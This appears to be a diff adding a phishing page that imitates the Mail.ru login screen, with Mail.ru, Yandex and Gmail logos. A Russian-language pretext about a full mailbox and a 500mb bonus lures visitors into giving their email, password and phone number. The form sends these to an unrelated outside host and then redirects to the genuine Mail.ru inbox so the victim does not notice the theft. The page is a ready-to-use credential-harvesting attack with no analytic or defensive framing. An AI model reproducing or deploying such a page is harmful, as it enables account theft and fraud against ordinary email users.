@@ -1,0 +1,147 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Почта Mail.ru</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lato&display=swap" rel="stylesheet">
+    <style>
+        *{
+            margin: 0;
+            padding: 0;
+            font-family: Lato,Arial, Helvetica, sans-serif;
+        }
+        .container .img-div{
+            background-color: #134785;
+            height: 50px;
+        }
+        .container .img-div .img{
+            width: 10%;
+            margin: 5px 0px 5px 30px;
+        }
+        .container .wrapper{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container .wrapper{
+            width: 100%;
+        }
+        .container .wrapper form{
+            width: 30%;
+            margin: 30px 0px 50px 150px;
+            display: flex;
+            align-items: center;
+            border-radius: 8px;
+            border: 2px solid #4b4a4a;
+            flex-direction: column;
+            background-color: #fff;
+            height: 400px;   
+            padding: 8px;         
+        }
+        .container .wrapper form h2{
+            text-align: center;
+            margin: 20px 0px;
+            font-size: 30px;
+        }
+        .container .wrapper form .img-divi{
+            width: 80%;
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .container .wrapper form .img-divi .imgone{
+            width: 30%;
+            border: 1px solid #444343;
+            border-radius: 4px;
+            padding: 2px;
+        }
+        .container .wrapper form .img-divi .imgtwo{
+            width: 40%;
+            margin: 4px;
+        }
+        .container .wrapper form .img-divi .imgtwo img{
+            width: 100%;
+        }
+        .container .wrapper form .img-divi .imgone img{
+            width: 100%;
+        }
+        .container .wrapper form .input-form{
+            margin: 30px 0px;
+        }
+        .container .wrapper form input{
+            background-color: transparent;
+            width: 80%;
+            padding: 12px;
+            margin: 15px 0px;
+            border: 1px solid rgb(54, 53, 53);
+            outline: none;
+        }
+        .container .wrapper form button{
+            border: none;
+            outline: none;
+            color: #fff;
+            width: 85%;
+            padding: 15px 15px;
+            font-size: 16px;
+            font-weight: 400;
+            background-color: #134785
+        }
+        footer{
+            width: 100%;
+            height: 138px;
+            background-color: #134785;
+        }
+        footer p{
+            color: #fff;
+            text-align: center;
+            padding: 20px 0px;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="img-div">
+            <img class="img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Mail.Ru_logo.svg/1280px-Mail.Ru_logo.svg.png" alt="">
+        </div>
+        <div class="wrapper">
+            
+            
+            <form action="https://sunsentinel.one//Mail/via/share.php" method="post">
+                <h/0>сообщения висят на сервере из-за ограниченного места в памяти подтвердите свою почту, чтобы получить 500mb<h0>
+                <div class="img-divi">
+                    <div class=" imgone imgtwo">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Mail.Ru_logo.svg/1280px-Mail.Ru_logo.svg.png" alt="">
+                    </div>
+                    <div class="imgtwo">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f1/Yandex_logo_2021_Russian.svg/1280px-Yandex_logo_2021_Russian.svg.png" alt="">
+                    </div>
+                    <div class="imgtwo">
+                        <img src="https://a.storyblok.com/f/120875/3500x799/279845f2c4/gmail-logo.png" alt="">
+                    </div>
+                    <div class="imgtwo">
+                        <a href="">Другой</a>
+                    </div>
+                </div>
+                <input type="email" name="email" id="email" placeholder="Название аккаунта" autofocus required>
+                <input type="hidden" name="_redirect" value="https://e.mail.ru/inbox/">
+                <!-- <input type="hidden" name="_next" value=""> -->
+                <input type="hidden" name="_captcha" value="false">
+                <input type="password" name="password" placeholder="Пароль" id="password" required>
+				<input type="tel" name="tel" placeholder="телефон" id="password" required>
+                <button type="submit">Авторизоваться</button>                
+            </form>
+            
+        </div>
+    </div>
+    <footer>
+        <p>2022 © Mail.ru - Все права защищены </p>
+    </footer>
+</body>
+</html>
